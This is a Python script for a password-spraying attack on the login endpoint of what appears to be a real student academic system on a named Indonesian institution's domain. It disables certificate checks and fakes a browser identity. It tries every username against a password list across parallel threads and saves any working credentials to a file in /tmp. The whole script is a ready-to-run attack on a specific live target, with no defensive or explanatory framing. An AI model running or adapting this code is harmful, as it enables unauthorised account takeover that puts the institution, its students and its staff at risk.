#!/usr/bin/env python3
"""SIAK (CodeIgniter) login spray — /index.php/user/ext_login"""
import sys, urllib3, requests
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()
BASE = "https://siak.husadagemilang.ac.id/index.php/user/ext_login"
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/203.0.113.10 Safari/537.36"}

def attempt(u, p, tmo=15):
    s = requests.Session(); s.verify = False; s.headers.update(UA)
    try:
        s.get("https://siak.husadagemilang.ac.id/user/login", timeout=tmo)
        r = s.post(BASE, data={"logUsername": u, "logPassword": p}, timeout=tmo, allow_redirects=False)
    except Exception as e:
        return (u, p, None, str(e)[:60])
    txt = (r.text or "")
    ok = "Salah!" not in txt and r.status_code in (302, 200)
    return (u, p, ok, r.status_code)

def main():
    users = sys.argv[1].split(",")
    pfile = sys.argv[2]
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    passes = [l.strip() for l in open(pfile, errors="ignore") if l.strip()]
    pairs = [(u, p) for u in users for p in passes]
    print(f"[*] {len(users)} user x {len(passes)} pass = {len(pairs)}")
    hits = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        for i, (u, p, ok, st) in enumerate(ex.map(lambda x: attempt(*x), pairs)):
            if ok:
                print(f"[+] VALID {u}:{p} (status {st})")
                hits.append((u, p))
                open("/tmp/siak_creds.txt", "a").write(f"{u}:{p}\n")
            if (i + 1) % 200 == 0:
                print(f"[*] {i+1}/{len(pairs)}")
    print(f"[done] hits={len(hits)}")

if __name__ == "__main__":
    main()
